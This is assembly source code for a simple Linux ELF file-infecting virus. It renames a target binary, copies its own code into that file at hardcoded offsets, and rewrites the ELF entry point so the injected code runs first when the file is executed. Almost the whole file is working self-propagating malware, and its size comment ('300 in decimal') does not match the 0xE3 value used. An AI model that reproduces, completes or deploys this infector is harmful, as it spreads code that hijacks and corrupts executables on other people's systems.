; CONSTANTS
SYS_OPEN  equ 2
SYS_RENAME equ 82
SYS_LSEEK equ 8
SYS_EXIT equ 60
SYS_CLOSE equ 3
SYS_WRITE equ 1
O_RDWR	equ 2
O_RDONLY equ 0
SYS_SENDFILE equ 40

;SECTION .data

SECTION .text
	global _start

fileName db "hello", 0
fileName_len equ $-fileName
injName db "hello_virus", 0
injName_len equ $-injName
injectEntry dd 0x401176
infectedOffset dd 0x11c9

_start:

	pop	r15
	pop	r15 	;file executed

	mov	rax, 	SYS_RENAME
	mov	rdi, 	fileName
	mov	rsi, 	injName
	syscall

	; OPEN CLEAN FILE
	;
	mov	rax,	SYS_OPEN
	mov	rdi,	injName ;injName
	mov	rsi,	O_RDWR
	syscall

	mov	r12,	rax	; r12 has clean file fd
	; OPEN INFECTED FILE
	;
	mov	rax,	SYS_OPEN
	mov	rdi,	r15
	mov	rsi,	O_RDONLY
	syscall

	mov	r13,	rax	;r13 infected file fd

	; lseek offset of current file
	mov	rdi,	r13
	mov	rax,	SYS_LSEEK
	mov	rsi,	0x156
	mov	rdx,	0
	syscall

	; lseek offset to entrypoint 
        mov	rdi,	r12	; fd
        mov	rax,	SYS_LSEEK ;sys call
        mov	rsi,	0x1156	; offset
        mov	rdx,	0	; Origin
        syscall

	; COPY INFECTED FILE TO CLEAN FILE
	mov	rax,	SYS_SENDFILE
	mov	rdi,	r12
	mov	rsi,	r13
	mov	rdx,	0x0
	mov	r10,	0xE3 	; size = 300 in decimal
	syscall

       ; lseek offset to entry point address
        mov	rdi,	r12	; fd
        mov	rax,	SYS_LSEEK ;sys call
        mov	rsi,	0x18	; offset
        mov	rdx,	0	; Origin
        syscall

       ; Change entrypoint clean EXE
        mov	rax,	SYS_WRITE
        mov	rdi,	r12
        mov	rsi,	injectEntry
        mov	rdx,	4
        syscall

	; FOR FIRST INFECTION change lseek offset in "clean" file to be correct
;	mov	rax,	SYS_LSEEK
;	mov	rdi,	r12
;	mov	rsi,	0x11c9
;	mov	rdx,	0
;	syscall
;
;	mov 	rax,	SYS_WRITE
;	mov	rdi,	r12
;	mov	rsi,	infectedOffset
;	mov	rdx,	4
;	syscall
;
 
        ; CLOSE ALL FILES
        mov	rax,	SYS_CLOSE
        mov	rdi,	r12
        syscall
 
 	mov	rax,	SYS_CLOSE
 	mov	rdi,	r13
 	syscall
 
 	mov	rax,	SYS_EXIT
 	mov	rdi,	0
 	syscall




